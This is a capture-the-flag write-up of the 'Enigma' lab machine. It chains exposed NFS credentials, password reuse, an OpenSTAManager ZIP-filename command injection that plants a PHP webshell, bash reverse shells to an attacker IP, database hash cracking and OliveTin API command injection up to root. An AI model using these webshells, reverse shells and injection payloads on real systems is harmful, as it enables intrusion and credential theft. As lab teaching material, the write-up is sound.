## Machine Information

- **Name**: Enigma
- **Difficulty**: Medium
- **OS**: Linux (Ubuntu)
- **Points**: 40

## 1. Reconnaissance & Initial Foothold

### Port Scanning
We begin with a standard Nmap scan to identify open ports and services.
```bash
nmap -sVC -p- <IP-ADDRESS>
```

![](Pasted%20image%2020260630002637.png)

**Key Findings:**
*   **Web Services:** HTTP (80) running nginx.
*   **Mail Services:** POP3 (110), IMAP (143), and their SSL counterparts (993, 995) running Dovecot.
*   **File Sharing:** NFS (2049) is exposed.

### NFS Enumeration
Since NFS is exposed, we check for exported shares using `showmount`.
```bash
showmount -e <IP-ADDRESS>
```

We find a specifically named share: `/srv/nfs/onboarding`.
We mount this share to our local machine to inspect its contents.


![](Pasted%20image%2020260630002732.png)

Inside, we find a PDF document. Opening it reveals onboarding credentials for a new employee, Kevin Mitchell:
*   **URL:** `http://mail001.enigma.htb`
*   **Username:** `kevin`
*   **Password:** `Enigma2024!`

![](Pasted%20image%2020260630002846.png)
### Email Enumeration & Password Reuse

#### Failed Attempt: POP3 via Telnet

Our first attempt to access Kevin's email was using Telnet on port 110 (POP3):
![](Pasted%20image%2020260630060528.png)

The server requires encrypted connections, so we couldn't use plaintext authentication on the standard POP3 port.

#### Successful Attempt: IMAPS via Curl

We attempt to read Kevin's emails. Since standard Telnet on port 110 failed due to plaintext authentication being disabled on non-secure connections, we use `curl` to interact with the IMAPS service (port 993) directly.

```bash
# List mailboxes
curl -s --url "imaps://10.129.25.250/" --user "kevin:Enigma2024!" -k

# Read the first email in the INBOX
curl -s --url "imaps://10.129.25.250/INBOX/;MAILINDEX=1" --user "kevin:Enigma2024!" -k
```

![](Pasted%20image%2020260630002955.png)

The email from Sarah mentions that system access credentials are on the company shared drive (which we already accessed via NFS). However, this gives us a new username: **sarah**. 

Testing for **password reuse**, we try Sarah's credentials (`sarah:Enigma2024!`) on the IMAPS service. It works! We read her inbox and find an email from IT Support containing the admin credentials for the internal support portal:
*   **URL:** `http://support_001.enigma.htb`
*   **Username:** `admin`
*   **Password:** `Ne3s4rtars78s`

![](Pasted%20image%2020260630003005.png)
---

## 2. Web Application Exploitation

#### Failed Attempts: Gobuster Scans

Before accessing the OpenSTAManager portal, we attempted to discover additional web content using Gobuster.

**Directory Enumeration**:
![](Pasted%20image%2020260630060752.png)
This FAILED to find any interesting directories.

**VHOST Enumeration:**

![](Pasted%20image%2020260630060843.png)

This also FAILED to discover any useful virtual hosts.
These failed attempts taught us that the main attack surface was through the subdomains we already knew about (mail001.enigma.htb and support_001.enigma.htb), not through hidden directories or vhosts.


#### OpenSTAManager RCE
We log into the OpenSTAManager portal using the admin credentials. Checking the footer or settings reveals the application version: **2.9.8 (5ff39df9b)**.

![](Pasted%20image%2020260630003016.png)

Searching for vulnerabilities for this specific version reveals **CVE-2025-69212**, an OS Command Injection vulnerability. The flaw exists in the P7M (signed XML) file import feature. The application uses `exec()` to run an `openssl` command, but fails to sanitize the filename inside the uploaded ZIP archive, allowing us to inject shell commands.

We use a Python exploit to craft a malicious ZIP file containing a `.p7m` file with a payload in its name. When the server processes the upload, it executes our payload, dropping a PHP webshell (`SHELL.php`) into the `/files/` directory.

![](Pasted%20image%2020260630003030.png)

```bash
python3 exploit.py -u http://support_001.enigma.htb -c "cd files && echo '<?php system(\$_GET[\"c\"]); ?>' > SHELL.php"
```

We verify our Remote Code Execution (RCE) by accessing the webshell:

![](Pasted%20image%2020260630003041.png)

We verified that our webshell was created and functional:
```bash
curl "http://support_001.enigma.htb/files/SHELL.php?c=id"
```

Output confirmed we had RCE as the web server user:

![](Pasted%20image%2020260630061127.png)

We also verified we can read system files
![](Pasted%20image%2020260630061156.png)

Using the command-line shell we get a reverse shell on our attacker machine

```bash
curl "http://support_001.enigma.htb/files/SHELL.php?c=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.15.31/4444+0>%261'"
```

---

## 3. Lateral Movement (www-data -> haris)

### Database Credential Extraction
With RCE as the web server user (`www-data`), we navigate to the OpenSTAManager root directory and read the database configuration file to find internal credentials.
```bash
cat config.inc.php
```

![](Pasted%20image%2020260630061214.png)

### Dumping User Hashes
Using the extracted credentials, we connect to the local MySQL database and dump the `zz_users` table, which contains the application's user accounts and password hashes.

![](Pasted%20image%2020260630061234.png)
```bash
mysql -u brollin -p'Fri3nds@9099' openstamanager -e "SELECT * FROM zz_users;"
```

![](Pasted%20image%2020260630061242.png)

We extract the bcrypt hash for the `haris` user and crack it offline using Hashcat (mode 3200 for bcrypt) and the `rockyou.txt` wordlist.
```bash
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```

![](Pasted%20image%2020260630061250.png)

### Pivoting to Haris
We now have the password for `haris` (`bestfriends`). However, simply running `su haris` in our webshell fails because `su` requires an interactive TTY to prompt for a password, which our basic PHP webshell does not provide.

To bypass this, we write a Python script (`/tmp/run.py`) to our target machine. This script uses the `pty` module to spawn a pseudo-terminal, allowing us to programmatically feed the password to the `su` prompt.

```python
# /tmp/run.py automates the 'su' password prompt
import pty, os, sys, time, select, base64
command = base64.b64decode(sys.argv[1]).decode()
process_id, file_descriptor = pty.fork()
if process_id == 0:
    os.execvp('su', ['su', '-', 'haris', '-c', command])
else:
    time.sleep(0.5)
    os.write(file_descriptor, b'bestfriends\n')
    # ... (reads and outputs the result)
```

We start a Netcat listener on our machine, encode a bash reverse shell payload in base64, and execute it through our Python script via the webshell:
```bash
PAYLOAD=$(echo -n "bash -c 'bash -i >& /dev/tcp/10.10.15.31/4445 0>&1'" | base64)
# Executed via the webshell:
python3 /tmp/run.py $PAYLOAD
```

![](Pasted%20image%2020260630061314.png)
We successfully catch a shell as `haris` and retrieve the user flag:
```bash
cat /home/haris/user.txt
```
![](Pasted%20image%2020260630061342.png)
---

## 4. Privilege Escalation (haris -> root)

### Local Service Enumeration
Now operating as `haris`, we enumerate local listening services to find a path to root. We use `ss` to check open ports.
```bash
ss -tulnp
```

![](Pasted%20image%2020260630061441.png)

We notice port **1337** is listening on the localhost interface. Investigating the filesystem reveals this service is **OliveTin**, a tool used to execute predefined shell commands via a web API.
![](Pasted%20image%2020260630061450.png)
### OliveTin Command Injection

OliveTin is configured with an action called `backup_database`, which likely runs a command similar to:
`mysqldump -u {db_user} -p'{db_pass}' {db_name}`

The `db_pass` parameter is vulnerable to command injection. We can break out of the single quotes and execute arbitrary commands. We craft a JSON payload to inject `cat /root/root.txt` into the password field.

```json
{
  "actionId": "backup_database",
  "arguments": [
    {"name": "db_user", "value": "backup_svc"},
    {"name": "db_pass", "value": "x' ; cat /root/root.txt ; #"},
    {"name": "db_name", "value": "production"}
  ]
}
```

We save this payload to `/tmp/payload.json` and send it to the local OliveTin API using `curl`:
```bash
curl -s -X POST http://127.0.0.1:1337/api/olivetin.api.v1.OliveTinApiService/StartActionAndWait \
     -H 'Content-Type: application/json' \
     -d @/tmp/payload.json
```

![](Pasted%20image%2020260630061509.png)

The API returns the output of the executed commands. Buried in the JSON response, right after the `mysqldump` usage warning, we find the root flag

## Attack Chain Summary
1. **NFS Share →** Found employee credentials PDF (kevin:Enigma2024!)
2. **Failed: POP3 via Telnet →** Plaintext auth disabled
3. **Success: IMAPS via Curl →** Read Kevin's emails
4. **Password Reuse →** sarah:Enigma2024! worked
5. **Email Enumeration →** Found OpenSTAManager admin credentials
6. **Failed: Gobuster Scans →** No hidden directories or vhosts found
7. **CVE-2025-69212 →** RCE as www-data via malicious ZIP upload
8. **Database Dump →** Extracted user password hashes
9. **Hash Cracking →** Cracked haris:bestfriends
10. **Failed: Simple `su` →** TTY requirement not met
11. **Success: Python PTY Script** → Shell as haris
12. **Service Enumeration →** Discovered OliveTin on port 1337
13. **Command Injection →** Root access via OliveTin API